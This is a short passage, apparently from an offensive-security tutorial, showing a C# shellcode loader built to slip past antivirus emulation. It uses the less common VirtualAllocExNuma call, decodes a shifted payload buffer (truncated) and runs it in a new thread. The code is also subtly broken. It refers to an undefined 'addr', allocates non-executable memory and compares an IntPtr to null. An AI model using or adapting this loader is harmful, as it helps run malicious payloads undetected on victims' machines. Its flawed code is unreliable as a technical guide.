Antivirus emulator engines only simulate the execution of most common executable file formats and functions:

```
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using System.Threading;



namespace ConsoleApp1
{
	class Program
	{
		[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]


		static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress,uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
		
		[DllImport("kernel32.dll")]static extern IntPtr CreateThread(IntPtr lpThreadAttributes,uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,uint dwCreationFlags, IntPtr lpThreadId);
		
		[DllImport("kernel32.dll")]static extern UInt32 WaitForSingleObject(IntPtr hHandle,UInt32 dwMilliseconds);
		
		[DllImport("kernel32.dll")]
		static extern IntPtr GetCurrentProcess();
		
		static void Main(string[] args)
		{
			byte[] buf = new byte[752] {0xfc,0x48,0x83,0xe4...}
			for(int i = 0; i < buf.Length; i++)
			{
				buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
			}
			int size = buf.Length;
			IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4,0);
			if(mem == null){
				return;
			}
			Marshal.Copy(buf, 0, addr, size);
			IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr,IntPtr.Zero, 0, IntPtr.Zero);
			WaitForSingleObject(hThread, 0xFFFFFFFF);
		}
	}
}
```